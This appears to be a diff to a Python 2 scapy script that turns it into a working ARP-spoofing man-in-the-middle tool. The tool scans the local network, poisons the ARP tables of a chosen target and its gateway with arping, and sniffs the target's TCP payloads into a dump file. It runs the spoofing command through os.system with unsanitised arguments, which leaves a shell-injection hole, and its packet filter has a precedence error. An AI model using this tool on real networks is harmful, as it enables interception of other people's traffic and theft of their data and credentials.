@@ -2,10 +2,17 @@
 import logging
 import argparse
 import sys
+import os
 import subprocess
 from scapy.all import *
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+mimetypes = ["multipart/form-data","text/plain","text/html","multipart/related",
+				"multipart/alternative","multipart/mixed","message/http",
+				"application/pdf"]
+target = None
+output = "dump"
 
 class Network:
 	ip=""
@@ -36,8 +43,14 @@ class Host:
 	ip = ""
 	mac = ""
 
+def mesg(mesg):
+	print "[[92;1m+[00m] {}".format(mesg)
+
+def warn(mesg):
+	print "[[93;1m![00m] {}".format(mesg)
+
 def err(mesg,exitCode):
-	print "[[97m-[00m] {}".format(mesg)
+	print "[[91;1m-[00m] {}".format(mesg)
 	sys.exit(exitCode)
 
 def initArgs():
@@ -53,17 +66,9 @@ def initArgs():
 	parser.add_argument("-o","--output",type=str,help="Output file")
 	return parser
 
-def poisonArp(interface,spoofIp,targetIp):
-	cmd = ["arping",
-			"-Uqi",
-			interface,
-			"-S",
-			spoofIp,
-			"-w",
-			"2000",
-			"targetIp",
-			"&"]
-	subprocess.Popen(cmd);
+def poisonArp(_interface,_spoofIp,_targetIp):
+	cmd = "arping -Uqi {} -S {} -w 2000 {} &".format(_interface,_spoofIp,_targetIp)
+	os.system(cmd);
 
 def getNetworkSize(_netmask):
 	netmask = _netmask.split(".")
@@ -93,7 +98,7 @@ def getNetwork(_interface):
 def probeNetwork(_network):
 	# Probe network for available devices
 	p = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=_network.ip+"/"+_network.size)
-	ans,unans = srp(p,timeout=2)
+	ans,unans = srp(p,timeout=2,verbose=0)
 	return ans
 
 def listDevices(_network):
@@ -112,9 +117,26 @@ def listDevices(_network):
 		res = 1
 	return list,res
 
+def svPkg(_pkg):
+	global target
+	global output
+	global mimetypes
+	if IP in _pkg:
+		pDst = _pkg[IP].fields['dst']
+		pSrc = _pkg[IP].fields['src']
+		if pDst == target.ip or pSrc == target.ip and _pkg.haslayer(TCP):
+			payload = _pkg.getlayer(TCP).payload
+			with open(output,'a') as f:
+				f.write(str(payload))
+				mesg("Packet intercepted")
+
+def sniffNetwork(_interface,_port):
+	sniff(iface=_interface, lfilter=svPkg,
+			filter="tcp and port {}".format(_port))
 
 def main():
-	# TODO: Check if progam is run as root
+	global target
+	global port
 	if os.getuid() != 0:
 		err("Program must be ran as root",1)
 	parser = initArgs();
@@ -134,17 +156,38 @@ def main():
 			sys.exit(0)
 		else:
 			err(list,1)
+	if not args.port:
+		warn("No port specified, using 80")
+		args.port = 80
 	if not args.router:
 		err("No target router specified",1)
 		sys.exit(1)
 	if not args.target:
 		err("No target host specifed",1)
-	if not parser.output:
-		print "No output file specified. Using `dump`."
-		parser.output = "dump"
-	if args.router and args.host:
-		me = Host();
+	if not args.output:
+		warn("No output file specified. Using `dump`.")
+	else:
+		output = args.output
+	if args.router and args.target:
+		me = Host()
 		me.mac = get_if_hwaddr(args.interface)
+		devices = probeNetwork(network)
+		router = Host()
+		router.ip = args.router
+		target = Host()
+		target.ip = args.target
+		for d in devices:
+			if router.ip == d[1].psrc:
+				router.mac = d[1].hwsrc
+			elif target.ip == d[1].psrc:
+				target.mac = d[1].hwsrc
+		poisonArp(args.interface,router.ip,target.ip)
+		mesg("Target ARP-table poisoned")
+		poisonArp(args.interface,target.ip,router.ip)
+		mesg("Gateway ARP-table poisoned")
+		mesg("Sniffing network...")
+		sniffNetwork(args.interface,args.port)
+	exit(0)
 
 if __name__ == '__main__':
 	main()
